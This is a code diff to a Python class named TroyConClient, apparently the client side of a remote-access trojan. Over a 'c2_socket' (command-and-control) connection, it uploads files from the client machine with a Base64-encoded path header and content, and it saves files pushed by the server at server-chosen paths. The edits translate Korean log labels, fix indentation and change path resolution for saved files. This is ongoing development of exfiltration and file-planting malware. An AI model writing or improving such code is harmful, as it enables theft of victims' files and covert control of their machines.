@@ -315,17 +315,17 @@ class TroyConClient:
                 file_content = f.read()
 
             # Phase 1: Send file metadata (header)
-           # Encode file path to Base64 before sending
+            # Encode file path to Base64 before sending
             encoded_file_path = base64.b64encode(file_path_on_client.encode('utf-8')).decode('ascii')
             header_str = f"FILE_UPLOAD_HEADER:{encoded_file_path}:{len(file_content)}"
             header_bytes = header_str.encode('utf-8')
 
             print(f"(Client file transfer): Header string to send (Base64 encoded path): '{header_str}'")
-            self._send_data_with_length_prefix(self.c2_socket, header_bytes, "파일 업로드 헤더")
+            self._send_data_with_length_prefix(self.c2_socket, header_bytes, "File upload header")
             print(f"[File Transfer] File header for '{file_path_on_client}' sent successfully.")
 
             # Phase 2: Send actual file content
-            self._send_data_with_length_prefix(self.c2_socket, file_content, "파일 내용") 
+            self._send_data_with_length_prefix(self.c2_socket, file_content, "File content") 
             print(f"[File Transfer] Starting to send file content for '{file_path_on_client}' ({len(file_content)} bytes original).")
 
             # Wait for server response after file transfer completion
@@ -385,8 +385,11 @@ class TroyConClient:
 
             if len(file_content_bytes) != file_length:
                 print(f"[Warning] File receive length mismatch: Expected {file_length}B, Actual {len(file_content_bytes)}B")
-
-            save_path = decoded_remote_file_path 
+            
+            if not os.path.isabs(decoded_remote_file_path): 
+                save_path = os.path.abspath(os.path.join(self.test_dir, decoded_remote_file_path))
+            else:
+                save_path = decoded_remote_file_path 
             
             target_directory = os.path.dirname(save_path)
             if target_directory and not os.path.exists(target_directory):
